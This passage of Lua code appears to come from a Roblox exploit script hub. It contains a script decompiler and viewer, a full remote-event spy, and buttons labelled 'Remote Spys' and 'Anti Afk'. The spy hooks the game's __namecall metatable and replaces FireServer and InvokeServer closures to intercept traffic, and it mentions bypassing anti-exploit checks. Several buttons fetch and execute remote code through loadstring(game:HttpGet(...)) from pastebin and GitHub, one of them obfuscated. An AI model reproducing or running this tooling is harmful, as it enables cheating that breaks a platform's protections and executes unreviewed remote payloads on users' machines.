					ResetButtonColor(ScrollThumbFrame)
					drag_con:disconnect(); drag_con = nil
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
			end)
		else
			ScrollThumbFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local mouse_offset = y - ScrollThumbFrame.AbsolutePosition.y
				local drag_con
				local up_con
				drag_con = MouseDrag.MouseMoved:connect(function(x,y)
					if not UserInputService:IsMouseButtonPressed'MouseButton1' then
						scrollEventID = tick()
						MouseDrag.Parent = nil
						ResetButtonColor(ScrollThumbFrame)
						drag_con:disconnect(); drag_con = nil
						up_con:disconnect(); drag = nil
					end
					local bar_abs_pos = ScrollBarFrame.AbsolutePosition.y
					local bar_drag = ScrollBarFrame.AbsoluteSize.y - ScrollThumbFrame.AbsoluteSize.y
					local bar_abs_one = bar_abs_pos + bar_drag
					y = y - mouse_offset
					y = y < bar_abs_pos and bar_abs_pos or y > bar_abs_one and bar_abs_one or y
					y = y - bar_abs_pos
					Class:SetScrollPercent(y/(bar_drag))
				end)
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollThumbFrame)
					drag_con:disconnect(); drag_con = nil
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
			end)
		end

		function Class:Destroy()
			ScrollFrame:Destroy()
			MouseDrag:Destroy()
			for k in pairs(Class) do
				Class[k] = nil
			end
			setmetatable(Class,nil)
		end

		Update()

		return Class
	end
end


-- End Scrollbar

local scrollBar = ScrollBar(false)
scrollBar.PageIncrement = 16
Create(scrollBar.GUI,{
	Position = UDim2.new(1,0,0,0);
	Size = UDim2.new(0,ScrollBarWidth,1,0);
	Parent = editorGrid;
})

local scrollBarH = ScrollBar(true)
scrollBarH.PageIncrement = 8
Create(scrollBarH.GUI,{
	Position = UDim2.new(0,0,1,0);
	Size = UDim2.new(1,0,0,ScrollBarWidth);
	Parent = editorGrid;
})

local wheelAmount = 24;

editorGrid.MouseWheelForward:connect(function()
	if input ~= nil and input.down ~= nil and input.down.leftshift then
		if scrollBarH.VisibleSpace - 1 > wheelAmount then
			scrollBarH:ScrollTo(scrollBarH.ScrollIndex - wheelAmount)
		else
			scrollBarH:ScrollTo(scrollBarH.ScrollIndex - scrollBarH.VisibleSpace)
		end
	else
		if scrollBar.VisibleSpace - 1 > wheelAmount then
			scrollBar:ScrollTo(scrollBar.ScrollIndex - wheelAmount)
		else
			scrollBar:ScrollTo(scrollBar.ScrollIndex - scrollBar.VisibleSpace)
		end
	end
end)
editorGrid.MouseWheelBackward:connect(function()
	if input ~= nil and input.down ~= nil and input.down.leftshift then
		if scrollBarH.VisibleSpace - 1 > wheelAmount then
			scrollBarH:ScrollTo(scrollBarH.ScrollIndex + wheelAmount)
		else
			scrollBarH:ScrollTo(scrollBarH.ScrollIndex + scrollBarH.VisibleSpace)
		end
	else
		if scrollBar.VisibleSpace - 1 > wheelAmount then
			scrollBar:ScrollTo(scrollBar.ScrollIndex + wheelAmount)
		else
			scrollBar:ScrollTo(scrollBar.ScrollIndex + scrollBar.VisibleSpace)
		end
	end
end)

local entries = {}

local grid = {}

local count = 1
local xCount = 1

local lineSpan = 0

for i = 0,editorGrid.AbsoluteSize.X - 20,8 do
	local newRow = {}
	for j = 0,390,16 do
		local cellText = Instance.new("TextLabel",editorGrid)
		cellText.Name = string.format('grid(%s,%s)', i, j);
		cellText.BackgroundTransparency = 1
		cellText.BorderSizePixel = 0
		cellText.Text = ""
		cellText.Position = UDim2.new(0,i,0,j)
		cellText.Size = UDim2.new(0,8,0,16)
		cellText.Font = Enum.Font.SourceSans
		cellText.FontSize = Enum.FontSize.Size18
		table.insert(newRow,cellText)
		xCount = xCount + 1
	end
	table.insert(grid,newRow)
	count = count + 1
	xCount = 1
end

local syntaxHighlightList = {
    {["Keyword"] = "for", 			["Color"] = Color3.fromRGB( 252, 97, 141), ["Independent"] = true};
    {["Keyword"] = "and", 			["Color"] = Color3.fromRGB( 252, 97, 141), ["Independent"] = true};
    {["Keyword"] = "or", 			["Color"] = Color3.fromRGB( 252, 97, 141), ["Independent"] = true};
	{["Keyword"] = "local", 		["Color"] = Color3.fromRGB( 252, 97, 141), ["Independent"] = true};
	{["Keyword"] = "if", 			["Color"] = Color3.fromRGB( 252, 97, 141), ["Independent"] = true};
	{["Keyword"] = "then", 			["Color"] = Color3.fromRGB( 252, 97, 141), ["Independent"] = true};
	{["Keyword"] = "do", 			["Color"] = Color3.fromRGB( 252, 97, 141), ["Independent"] = true};
	{["Keyword"] = "while", 		["Color"] = Color3.fromRGB( 252, 97, 141), ["Independent"] = true};
	{["Keyword"] = "end", 			["Color"] = Color3.fromRGB( 252, 97, 141), ["Independent"] = true};
	{["Keyword"] = "function", 		["Color"] = Color3.fromRGB( 252, 97, 141), ["Independent"] = true};
	{["Keyword"] = "return", 		["Color"] = Color3.fromRGB( 252, 97, 141), ["Independent"] = true};
	{["Keyword"] = "break", 		["Color"] = Color3.fromRGB( 252, 97, 141), ["Independent"] = true};
	{["Keyword"] = "else", 			["Color"] = Color3.fromRGB( 252, 97, 141), ["Independent"] = true};
	{["Keyword"] = "elseif", 		["Color"] = Color3.fromRGB( 252, 97, 141), ["Independent"] = true};
    {["Keyword"] = "in", 			["Color"] = Color3.fromRGB( 252, 97, 141), ["Independent"] = true};
    {["Keyword"] = "+", 			["Color"] = Color3.fromRGB( 252, 97, 141), ["Independent"] = true};
    {["Keyword"] = "-", 			["Color"] = Color3.fromRGB( 252, 97, 141), ["Independent"] = true};
    {["Keyword"] = "*", 			["Color"] = Color3.fromRGB( 252, 97, 141), ["Independent"] = true};
    {["Keyword"] = "/", 			["Color"] = Color3.fromRGB( 252, 97, 141), ["Independent"] = true};
    {["Keyword"] = "%", 			["Color"] = Color3.fromRGB( 252, 97, 141), ["Independent"] = true};
    {["Keyword"] = "^", 			["Color"] = Color3.fromRGB( 252, 97, 141), ["Independent"] = true};
    {["Keyword"] = "=", 			["Color"] = Color3.fromRGB( 252, 97, 141), ["Independent"] = true};
    {["Keyword"] = ",", 			["Color"] = Color3.fromRGB( 252, 97, 141), ["Independent"] = true};
    {["Keyword"] = "true", 			["Color"] = Color3.fromRGB(122, 114, 185), ["Independent"] = true};
    {["Keyword"] = "false", 		["Color"] = Color3.fromRGB(122, 114, 185), ["Independent"] = true};
    {["Keyword"] = "nil", 			["Color"] = Color3.fromRGB(122, 114, 185), ["Independent"] = true};
}

for i,v in pairs(getrenv()) do
    if type(v)=='function' and type(i)=='string' then
        table.insert(syntaxHighlightList, {['Keyword']=i, ["Color"] = Color3.fromRGB(123, 216, 143), ["Independent"] = true})
    end
end


function checkMouseInGui(gui)
	if gui == nil then return false end
	local plrMouse = game:GetService'Players'.LocalPlayer:GetMouse()
	local guiPosition = gui.AbsolutePosition
	local guiSize = gui.AbsoluteSize	
	
	if plrMouse.X >= guiPosition.x and plrMouse.X <= guiPosition.x + guiSize.x and plrMouse.Y >= guiPosition.y and plrMouse.Y <= guiPosition.y + guiSize.y then
		return true
	else
		return false
	end
end

function AddZeros(num,reach)
	local toConvert = tostring(num)
	while #toConvert < reach do
		toConvert = " "..toConvert
	end
	return toConvert
end

function buildScript(source,xOff,yOff,override)
	local buildingRows = true
	local buildScr = source
	
	local totalLines = 0

	if currentSource ~= source then
		currentSource = source
	end

	if override then
		currentSource = source
		entries = {}
		buildScr = tostring(buildScr);
		while buildingRows do
			local x,y = string.find(buildScr,"\n")
			if x and y then
				table.insert(entries,string.sub(buildScr,1,y))
				buildScr = string.sub(buildScr,y+1,string.len(buildScr))
			else
				buildingRows = false
				table.insert(entries,buildScr)
			end
		end
	end
	
	totalLines = #entries
	lineSpan = #tostring(totalLines)
	
	if lineSpan == 1 then lineSpan = 2 end
	
	local currentRow = 1
	local currentColumn = 2 + lineSpan
	
	local colorTime = 0
	local colorReplace = nil
	
	local inString = false
	
	local workingEntries = entries
	
	--[[
	for i,v in pairs(entries) do
		table.insert(workingEntries,v)
	end
	
	for i = 1,yOff do
		table.remove(workingEntries,1)
	end
	--]]
	
	local delayance = xOff

	for i = 1,#grid do
		for j = 1,#grid[i] do
			if i <= lineSpan then
				local newNum = AddZeros(yOff + j,lineSpan)
				local newDigit =  string.sub(newNum,i,i)
				if newDigit == " " then
					grid[i][j].Text = ""
				else
					grid[i][j].Text = newDigit
				end

				-- grid[i][j].BorderSizePixel = 1

				grid[i][j].TextColor3 = Color3.fromRGB(245, 245, 245)
				grid[i][j].BackgroundTransparency = 0
				grid[i][j].BackgroundColor3 = Color3.fromRGB(60, 60, 60)
				grid[i][j].Font = Enum.Font.SourceSans
			elseif i == lineSpan + 1 then
				-- grid[i][j].BorderSizePixel = 1

				grid[i][j].Text = ""
				grid[i][j].BackgroundTransparency = 0
				grid[i][j].BackgroundColor3 = Color3.fromRGB(55, 55, 55)
				-- grid[i][j].Font = Enum.Font.SourceSans
			else
				-- grid[i][j].BorderSizePixel = 1

				grid[i][j].Text = ""
				grid[i][j].BackgroundTransparency = 1
				--grid[i][j].Font = Enum.Font.SourceSans
			end
		end
	end
	
	while true do
		if currentRow > #workingEntries or currentRow > #grid[1] then break end
		local entry = workingEntries[currentRow+yOff]
		while entry ~= nil and typeof(entry) == 'string' and string.len(entry) > 0 do
			if string.sub(entry,1,1) == "\t" then entry = "    "..string.sub(entry,2) end
			
			if currentColumn > #grid then break end
			
			if delayance == 0 then
				grid[currentColumn][currentRow].Text = string.sub(entry,1,1)
			end
			
			-- Coloring
			
			if not inString then
				for i,v in pairs(syntaxHighlightList) do
					if string.sub(entry,1,string.len(v["Keyword"])) == v["Keyword"] then
						if v["Independent"] then
							local outCheck = string.len(v["Keyword"])+1
							local outEntry = string.sub(entry,outCheck,outCheck)
							if not string.find(outEntry,"%w") then
								colorTime = string.len(v["Keyword"])
								colorReplace = v["Color"]
							end
						else
							colorTime = string.len(v["Keyword"])
							colorReplace = v["Color"]
						end
					end
				end
			end
			
			if string.sub(entry,1,1) == "\"" and string.match(entry,"\".+\"") then
				inString = true
				colorTime = string.len(string.match(entry,"\".+\""))
				colorReplace = Color3.fromRGB(243, 221, 99);
			end

			local oldTC3 = Color3.fromRGB(244, 244, 244); --grid[currentColumn][currentRow].TextColor3
			
			if colorTime > 0 then
				colorTime = colorTime - 1
				oldTC3 = grid[currentColumn][currentRow].TextColor3
				grid[currentColumn][currentRow].TextColor3 = colorReplace
				if colorTime == 0 then inString = false end
			else
				grid[currentColumn][currentRow].TextColor3 = oldTC3 --Color3.new(0,0,0)
				inString = false
			end
			
			if delayance == 0 then
				currentColumn = currentColumn + 1
			else
				delayance = delayance - 1
			end
			entry = string.sub(entry,2,string.len(entry))
		end
		currentRow = currentRow + 1
		currentColumn = 2 + lineSpan
		colorTime = 0
		delayance = xOff
		inString = false
	end
end

function scrollBar.UpdateCallback(self)
	scrollBar.TotalSpace = #entries * 16
	scrollBar.VisibleSpace = editorGrid.AbsoluteSize.Y
	buildScript(currentSource,math.floor(scrollBarH.ScrollIndex/8),math.floor(scrollBar.ScrollIndex/16))
end

function scrollBarH.UpdateCallback(self)
	scrollBarH.TotalSpace = (getLongestEntry(entries) + 1 + lineSpan) * 8
	scrollBarH.VisibleSpace = editorGrid.AbsoluteSize.X
	buildScript(currentSource,math.floor(scrollBarH.ScrollIndex/8),math.floor(scrollBar.ScrollIndex/16))
end

function getLongestEntry(tab)
	local longest = 0
	for i,v in pairs(tab) do
		if string.len(v) > longest then
			longest = string.len(v)
		end
	end
	return longest
end

function openScript(scrObj)
	if scrObj:IsA("LocalScript") then
		scrObj.Archivable = true
		scrObj = scrObj:Clone()
		scrObj.Disabled = true
	end
	
	local scrName = scrObj.Name
	local scrSource = decompile(scrObj)
	currentScrName = scrObj.Name;
	
	table.insert(memoryScripts,{Name = scrName,Source = scrSource})
	
	local newTab = entryTemplate:Clone()
	newTab.Button.Text = scrName
	newTab.Position = UDim2.new(0,#scriptBar:GetChildren() * 100,0,0)
	newTab.BackgroundColor3 = Color3.new(33, 33, 33)
	newTab.Visible = true
	
	newTab.Button.MouseButton1Down:connect(function()
		for i,v in pairs(scriptBar:GetChildren()) do
			if v == newTab then
				editingIndex = i
				buildScript(memoryScripts[i].Source,0,0,true)
				wait(.1);
				scrollBar:ScrollTo(1)
				scrollBar:Update()
				scrollBarH:ScrollTo(1)
				scrollBarH:Update()
			end
		end
	end)
	
	newTab.Close.MouseButton1Click:connect(function()
		for i,v in pairs(scriptBar:GetChildren()) do
			if v == newTab then
				table.remove(memoryScripts,i)
				if editingIndex == i then
					editingIndex = #memoryScripts
					if editingIndex > 0 then
						buildScript(memoryScripts[#memoryScripts].Source,0,0,true)
					else
						buildScript("",0,0,true)
					end
				end
				
				scrollBar:ScrollTo(1)
				scrollBar:Update()
				scrollBarH:ScrollTo(1)
				scrollBarH:Update()
				
				for i2 = i,#scriptBar:GetChildren() do
					scriptBar:GetChildren()[i2].Position = scriptBar:GetChildren()[i2].Position + UDim2.new(0,-100,0,0)
				end
				if editingIndex > i then
					editingIndex = editingIndex - 1
				end
				newTab:Destroy()
			end
		end
	end)
	
	editingIndex = #memoryScripts
	buildScript(scrSource,0,0,true)
	
	newTab.Parent = scriptBar
end

getgenv().openScript = openScript;

function updateScriptBar()

end

function _updateScriptBar()
	local entryCount = 0
	
	scriptBarLeft.Active = false
	scriptBarLeft.AutoButtonColor = false
	for i,v in pairs(scriptBarLeft["Arrow Graphic"]:GetChildren()) do
		v.BackgroundTransparency = 0.7
	end
	scriptBarRight.Active = false
	scriptBarRight.AutoButtonColor = false
	for i,v in pairs(scriptBarRight["Arrow Graphic"]:GetChildren()) do
		v.BackgroundTransparency = 0.7
	end
	for i,v in pairs(scriptBar:GetChildren()) do
		if v.Position.X.Offset < 0 then
			scriptBarLeft.Active = true
			for i,v in pairs(scriptBarLeft["Arrow Graphic"]:GetChildren()) do
				v.BackgroundTransparency = 0
			end
		elseif v.Position.X.Offset >= 0 then
			entryCount = entryCount + 1
			if entryCount == 5 then
				scriptBarRight.Active = true
				for i,v in pairs(scriptBarRight["Arrow Graphic"]:GetChildren()) do
					v.BackgroundTransparency = 0
				end
			end
		end
	end
end

scriptBar.ChildAdded:connect(updateScriptBar)
scriptBar.ChildRemoved:connect(updateScriptBar)

scriptBarLeft.MouseButton1Click:connect(function()
	if scriptBarLeft.Active == false then return end
	for i,v in pairs(scriptBar:GetChildren()) do
		v.Position = v.Position + UDim2.new(0,100,0,0)
	end
	updateScriptBar()
end)

scriptBarRight.MouseButton1Click:connect(function()
	if scriptBarRight.Active == false then return end
	for i,v in pairs(scriptBar:GetChildren()) do
		v.Position = v.Position + UDim2.new(0,-100,0,0)
	end
	updateScriptBar()
end)

mouse.Button1Down:connect(function()
	if checkMouseInGui(editorGrid) then
	end
end)

openEvent.Event:connect(function(...)
	top.Visible = true
	local args = {...}
	if #args > 0 then
		openScript(args[1])
	end
end)

clipboardButton.MouseButton1Click:connect(function()
	if Clipboard and Clipboard.set then
		Clipboard.set(currentSource)
	elseif CopyString then
		CopyString(currentSource)
	elseif Synapse then
		Synapse:Copy(currentSource)
	elseif setclipboard then
		setclipboard(currentSource)
	end
end)

saveScriptButton.MouseButton1Click:connect(function()
	if Synapse then
		Synapse:WriteFile(game.PlaceId .. '_' .. currentScrName:gsub('%W', '') .. '_' .. math.random(100000, 999999) .. '.lua', currentSource)
	elseif writefile then
		writefile(game.PlaceId .. '_' .. currentScrName:gsub('%W', '') .. '_' .. math.random(100000, 999999) .. '.lua', currentSource);
	end
end)

closeButton.MouseButton1Click:connect(function()
	top.Visible = false
end)

--[[
local scr = script.Parent:WaitForChild("Scr")
local scr2 = script.Parent:WaitForChild("Scr2")
local scr3 = script.Parent:WaitForChild("Scr3")
local scr4 = script.Parent:WaitForChild("TOS")
local scr5 = script.Parent:WaitForChild("HW")
--]]

buildScript("",0,0,true)
--[[
openScript(scr)
openScript(scr2)
openScript(scr3)
openScript(scr4)
openScript(scr5)
--]]

scrollBar:Update()
scrollBarH:Update()
end)

function ScrambleNames(A)
	for i,v in pairs(A:GetDescendants()) do
		v.Name = RandomCharacters(math.random(16, 64));
	end
end

wait(.25)

D_E_X.Parent = coregui
end)




d:h1("Remote Spys")

d:Button("MrSpy2",function()
   loadstring(game:HttpGet("https://pastebin.com/raw/hYPZCW3i", true))()

end)

d:Button("MrSpy",function()
   --loadstringed by chickenz
loadstring(game:HttpGet(("https://pastebin.com/raw/XVqQEiuB"),true))()
end)

d:Button("SimpleSpy",function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/exxtremestuffs/SimpleSpy/master/SimpleSpy_0.1-obfuscated.lua"))()
end)

d:Button("Sire's Remote Spy",function()
   --toggle classes by switching true/false
SpyOn = {
	RemoteEvent = true;
	RemoteFunction = true;
	BindableEvent = false;
	BindableFunction = false;
}
--if true will spy 'hidden' events
spyNilInstances = false
--list of names it will ignore e.g. {"a","b"}
Ignore = {}
--maximum number of sections at once
numMaxSections = 25
--size of padding inside sections
yindent = 20
--/////////////////////////////////////////////////////////////////////////////////////
--by sirelKilla (v3rm)  // fixed by stellar

if Synapse==nil then
	warn("This spy is best used with Synapse.")
end

local MT = getrawmetatable(game)
if setreadonly then setreadonly(MT,false) end
if make_writeable then make_writeable(MT) end
local oldNamecall = MT.__namecall

local Player = game:GetService("Players").LocalPlayer
--basically makes a background
MakeShadow = function(GUI, Deepness)
	for i=1, Deepness do
		local G = GUI:Clone()
		G.ZIndex = GUI.ZIndex - 1
		G.Size=UDim2.new(1,12,1,12)
		G.Position=UDim2.new(0,-6,0,-6)
		G.Active=false
		G.Draggable=false
		G:ClearAllChildren()
		G.Name = GUI.Name.." Shadow"
		G.Parent = GUI
	end
end
--create basic frames
local CanScroll = true
local GUI = Instance.new("ScreenGui",game.CoreGui)
GUI.Name = "SpyScroller"
GUI.ResetOnSpawn = false
GUI.DisplayOrder = 10000
local Main = Instance.new("Frame", GUI)
Main.Active = true
Main.ZIndex = 10000
Main.Size = UDim2.new(0.27, 0, 0.32, 0)
Main.Draggable = true
Main.Style = "DropShadow"
Main.Position = UDim2.new(0.05, 0, 0.05, 0)
MakeShadow(Main, 4)
local Bar = Instance.new("Frame", Main)
Bar.BackgroundColor3=Color3.fromRGB(40,40,40)
Bar.Size = UDim2.new(1, 20, 0.13, 0)
Bar.Position = UDim2.new(0, -10, -0.03)
Bar.ZIndex = Main.ZIndex+1
local Title = Instance.new("TextLabel", Bar)
Title.BackgroundTransparency = 1
Title.Position=UDim2.new(0,10)
Title.TextColor3 = Color3.new(1, 1, 1)
Title.Font = "SourceSansBold"
Title.Text = "Remote Spy"
Title.TextSize = 15
Title.ZIndex = Main.ZIndex+3
Title.TextXAlignment = "Left"
Title.Size = UDim2.new(1, 0, 1, 0)
local Exit = Instance.new("TextButton", Bar)
Exit.BackgroundTransparency = 1
Exit.Text = "x"
Exit.TextColor3 = Color3.new(1, 1, 1)
Exit.Size = UDim2.new(0.08, 0, 1.5, 0)
Exit.TextSize = 20
Exit.TextWrapped = false
Exit.Position = UDim2.new(0.95, -10, -0.28, 0)
Exit.Font = "SourceSansBold"
Exit.ZIndex = Main.ZIndex+1
Exit.MouseButton1Up:connect(function()
	GUI:Destroy()
	MT.__namecall = oldNamecall
end)
Exit.MouseEnter:connect(function()
	Exit.TextColor3 = Color3.new(1, 0, 0)
end)
Exit.MouseLeave:connect(function()
	Exit.TextColor3 = Color3.new(1, 1, 1)
end)
local Scroll = Instance.new("ScrollingFrame", Main)
Scroll.BackgroundTransparency = 1
Scroll.Name = "Scroll"
Scroll.Size = UDim2.new(1, 0, 0.9, 0)
Scroll.ZIndex = Main.ZIndex+1
Scroll.Position = UDim2.new(0, 0, 0.1, 0)
Scroll.BorderSizePixel = 0
Scroll.CanvasSize = UDim2.new()
--clipboard gui
local Popup = Instance.new("TextButton",GUI)
Instance.new("StringValue",Popup).Name = "ToCopy"
Popup.Name="ClipboardBtn"
Popup.Text="Copy"
Popup.Size=UDim2.new(0,40,0,20)
Popup.ZIndex=Main.ZIndex+4
Popup.Visible=false
Popup.MouseButton1Down:Connect(function()
	if Synapse then
		Synapse:CopyString(Popup.ToCopy.Value)
	elseif setclipboard then
		setclipboard(Popup.ToCopy.Value)
	elseif Clipboard then
		Clipboard.set(Popup.ToCopy.Value)
	end
	Popup.Visible=false
end)
--bottom-right resizer
--////
local resize = Instance.new("ImageButton")
resize.Name = "resize"
resize.BackgroundTransparency = 1
resize.Image = "rbxassetid://55927414"
resize.ZIndex = Main.ZIndex+1
resize.Size = UDim2.new(0,13,0,13)
resize.Position = UDim2.new(1,-9,1,-9)
resize.Active=true
resize.Draggable=true
local resizing=false
local mouseConn
resize.DragBegin:Connect(function()
	--basically moves sizer to only absolutes..
	local rAP = resize.AbsolutePosition
	resize.Parent = GUI
	resize.Position = UDim2.new(0,rAP.X,0,rAP.Y)
	--then offsets main size based on those values
	local mS = Main.Size
	local mAS = Main.AbsoluteSize
	local addX,addY=0,0
	mouseConn = Player:GetMouse().Move:Connect(function()
		--most of this is to keep stuff from going negative
		addX,addY = math.max(-mAS.X+240,resize.AbsolutePosition.X - rAP.X),math.max(-mAS.Y+100,resize.AbsolutePosition.Y - rAP.Y)
		Main.Size=mS + UDim2.new(0,addX,0,addY)
		--hide if negative
		if addX>-mAS.X+240 and addY>-mAS.Y+100 then
			resize.ImageTransparency = 0
		else
			resize.ImageTransparency = 1
		end
	end)
end)
resize.DragStopped:Connect(function()
	--turn to normal
	resize.Parent = Main
	resize.Position = UDim2.new(1,-9,1,-9)
	resize.ImageTransparency = 0
	mouseConn:Disconnect()
end)
resize.Parent = Main
--////
local function isMouseDown()
	local array = game:GetService("UserInputService"):GetMouseButtonsPressed()
	for i=1,#array do
		if array[i].UserInputType==Enum.UserInputType.MouseButton1 then
			return true
		end
	end
	return false
end
local db=false
Scroll:GetPropertyChangedSignal("CanvasPosition"):Connect(function()
	if db==false and CanScroll==false and isMouseDown() then
		db=true
		Main.Active=false
		repeat wait(0.5) until not isMouseDown()
		Main.Active=true
		db=false
	end
end)
Instance.new("UIListLayout",Scroll).SortOrder = Enum.SortOrder.LayoutOrder
local sectionIndex = 0

local Console = {}
Console.White = Color3.new(1, 1, 1)
Console.LightGray = Color3.fromRGB(155, 155, 155)
local CurrentColour = Console.White
local CurrentSection
local NumLabels = 0
local sections = {}

function Console:WriteLine(Text)
	pcall(function()
		if CurrentSection and tostring(Text) then
			NumLabels=NumLabels+1
			local TL = Instance.new("TextLabel")
			TL.Parent = CurrentSection
			TL.Text = tostring(Text)
			TL.TextColor3 = CurrentColour
			TL.BackgroundTransparency = 1
			TL.Font = "SourceSansBold"
			TL.TextSize = 14
			TL.ZIndex = Main.ZIndex+3
			TL.TextXAlignment = "Left"
			TL.TextWrapped = false
			TL.Size = UDim2.new(1, 0, 0, 20)
			local Y = #CurrentSection:GetChildren()*20
			TL.Position = UDim2.new(0, 0, 0, Y-20 + yindent/2)
			CurrentSection.Size = UDim2.new(1, 0, 0, Y + yindent)
			if CanScroll then
				Scroll.CanvasSize = UDim2.new(0, 0, 0, NumLabels*20)
				Scroll.CanvasPosition = Vector2.new(0, Scroll.CanvasSize.Y.Offset)
			end
		end
	end)
end
function Console:SetColor(Color)
	CurrentColour = Color
end
function Console:PushSection(ClipboardText)
	if #sections < numMaxSections then --if going to add a section
		NumLabels=NumLabels+(yindent/20) --just increases scroller size
	end
	sectionIndex=sectionIndex+1
	local f = Instance.new("Frame")
	f.BackgroundTransparency = 1 - (0.07 * (sectionIndex % 2)) --alternate colors
	f.BorderSizePixel=2
	f.BorderColor3=Color3.new(1,1,1)
	f.ZIndex = Main.ZIndex+2
	f.Size = UDim2.new()
	
	if ClipboardText~=nil then
		--on right click show copy option label, which copies text when clicked
		f.InputEnded:Connect(function(input)
			if input.UserInputType==Enum.UserInputType.MouseButton2 then
				Popup.ToCopy.Value = ClipboardText
				Popup.Position = UDim2.new(0,Player:GetMouse().X+1,0,Player:GetMouse().Y+1)
				Popup.Visible=true
				game:GetService("UserInputService").InputBegan:Wait()
				wait()
				Popup.Visible=false
			end
		end)
	end
	
	f.LayoutOrder = sectionIndex --for UIListLayout
	if #sections >= numMaxSections and CanScroll then
		--removes any extra sections. limited by CanScroll or else the rotations will still look like scrolling
		for i=0,#sections-numMaxSections do
			NumLabels = NumLabels - #sections[1]:GetChildren()
			sections[1]:Destroy()
			table.remove(sections,1)
		end
	end
	sections[#sections+1]=f
	f.Parent = Scroll
	
	CurrentSection = f
end

Console:SetColor(Console.White)

Main.MouseEnter:connect(function()
	CanScroll = false
end)
Main.MouseLeave:connect(function()
	CanScroll = true
	--"unpause"
	for i=1,#sections-numMaxSections do
		NumLabels = NumLabels - #sections[1]:GetChildren()
		sections[1]:Destroy()
		table.remove(sections,1)
	end
	Scroll.CanvasSize = UDim2.new(0, 0, 0, NumLabels*20)
end)

--//// utilities ////
local function isInArray(t,v)
	for i=1,#t do
		if t[i]==v then
			return true
		end
	end
	return false
end

local function instFormat(name)
	if name=='' or name:match("[^_%w]") or name:match("^%d") then
		return '["'..name..'"]'
	end
	return "."..name
end
local function GetPath(inst)
	if inst==game then return "game" end
	if inst.Parent==nil then return inst.Name end
	local current,str=inst,''
	while current.Parent~=game do
		str=instFormat(current.Name) ..str
		current = current.Parent
	end
	if current==workspace then
		return "workspace"..str
	elseif pcall(game.GetService,game,current.ClassName) then
		return 'game:GetService("'.. current.ClassName ..'")'..str
	end
	return "game"..instFormat(current.Name)..str
end

local FullPathsMode = false --internally toggled for using GetPath
local function _tostring(x)
	local typ = typeof(x)
	if typ == "table" then
		return tableToString(x)
	elseif typ == "string" then
		return '"'..x..'"'
	elseif typ == "Vector3" then
		return string.format("Vector3.new(%g,%g,%g)",x.X,x.Y,x.Z)
	elseif typ == "Color3" then
		return string.format("Color3.new(%g,%g,%g)",x.r,x.g,x.b)
	elseif typ == "Vector2" then
		return string.format("Vector2.new(%g,%g)",x.X,x.Y)
	elseif typ == "CFrame" then
		return string.format("CFrame.new(%g,%g,%g,%g,%g,%g,%g,%g,%g,%g,%g,%g)",x:components())
	elseif typ == "UDim2" then
		return string.format("UDim2.new(%g,%g,%g,%g)",x.X.Scale,x.X.Offset,x.Y.Scale,x.Y.Offset)
	elseif typ == "Instance" then
		return ((FullPathsMode==true) and GetPath(x)) or x:GetFullName()
	end
	
	return tostring(x)
end

function tableToString(tab)
	local str = "{ "
	local len = #tab

	local c = 1
	for k,v in pairs(tab) do
		if (k==c and k<=len) then
			--array part
			str = str .. _tostring(v) .. ", "
			c = c + 1
		else
			--dict part
			str = str .. "[" .. _tostring(k) .. "]= " .. _tostring(v) .. ", "
		end
	end
	
	str = str:sub(1,math.max(1,#str-2)) .. " }"
	return str
end

function tupleString(tab,fullPaths)
	FullPathsMode=fullPaths
	return tableToString(tab):sub(3,-3)
end
--//// end utilities ////

toConsole = function(method, event, Args, Returned)
	local nilParent = game:IsAncestorOf(event)==false
	if (spyNilInstances==false and nilParent==true) or (event.Name=="CharacterSoundEvent" and event.Parent and event.Parent.ClassName=="Sound") or isInArray(Ignore,event.Name) then
		--ignored an event
		return
	end
	pcall(function()
		Console:PushSection(string.format("%s:%s(%s)",GetPath(event),method,tupleString(Args,true)))
		Console:WriteLine(string.format("%s.%s called!",event.ClassName,method))
		Console:WriteLine("Path: "..event:GetFullName())
		Console:WriteLine("Args: "..tupleString(Args))
		if Returned and #Returned>0 then
			Console:WriteLine("Returned: ".. tupleString(Returned))
		end
	end)
end

local logsList = {}

MT.__namecall = function(inst,...)
	local args = {...}
	local m = getnamecallmethod()
	args[#args]=nil
	if (m=="FireServer" or m=="Fire" or m=="InvokeServer" or m=="Invoke") and SpyOn[inst.ClassName] then
		local returned = {oldNamecall(inst,...)}
		logsList[#logsList+1]={m, inst, args, returned}
		return unpack(returned)
	end
	return oldNamecall(inst,...)
end

local spyfunc = hookfunc or replaceclosure
if spyfunc then
if SpyOn.RemoteEvent==true then
	local oldFS
	oldFS = spyfunc(Instance.new("RemoteEvent").FireServer,newcclosure(function(self,...)
		logsList[#logsList+1]={"FireServer",self,{...}}
		return oldFS(self,...)
	end))
end
if SpyOn.RemoteFunction==true then
	local oldIS
	oldIS = spyfunc(Instance.new("RemoteFunction").InvokeServer,newcclosure(function(self,...)
		local returned = {oldIS(self,...)}
		logsList[#logsList+1]={"InvokeServer",self,{...},returned}
		return unpack(returned)
	end))
end
if SpyOn.BindableEvent==true then
	local oldF
	oldF = spyfunc(Instance.new("BindableEvent").Fire,function(self,...)
		logsList[#logsList+1]={"Fire",self,{...}}
		return oldF(self,...)
	end)
end
if SpyOn.BindableFunction==true then
	local oldI
	oldI = spyfunc(Instance.new("BindableFunction").Invoke,function(self,...)
		local returned = {oldI(self,...)}
		logsList[#logsList+1]={"Invoke",self,{...},returned}
		return unpack(returned)
	end)
end
else
warn("Unable to bypass antiexploits.")
end

Console:PushSection()
Console:WriteLine("Right-click any section for clipboard option")

while wait() and GUI.Parent do
	if #logsList>0 then
		toConsole(unpack(table.remove(logsList,1)))
	end
end
end)


e:h1("Extra scripts")

e:Button("Anti Afk",function()
    --[[
IronBrew:tm: obfuscation; Version 2.7.2
]]
